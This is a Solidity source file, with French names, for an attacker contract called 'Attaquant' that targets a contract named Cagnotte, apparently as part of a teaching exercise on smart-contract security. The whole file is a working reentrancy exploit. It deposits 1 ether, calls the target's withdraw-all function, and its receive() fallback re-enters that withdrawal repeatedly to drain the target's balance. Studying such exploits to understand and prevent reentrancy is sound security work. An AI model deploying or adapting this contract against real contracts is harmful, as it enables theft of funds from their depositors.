// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Cagnotte} from "./Cagnotte.sol";

/// @title Attaquant — un contrat malveillant pour attaquer Cagnotte
contract Attaquant {

    Cagnotte cible;
    address public immutable owner;
    constructor(Cagnotte _cible) payable { 
        cible = _cible; 
        owner = msg.sender; 
    }

    function attaquer() external { 
        
        require(address(this).balance > 0, "Pas d'ether pour attaquer");
        cible.deposer{value: 1 ether}();
        cible.retirerTout();
    }

    receive() external payable { 
        if (address(cible).balance >= msg.value) {
            cible.retirerTout();
        }

    }
}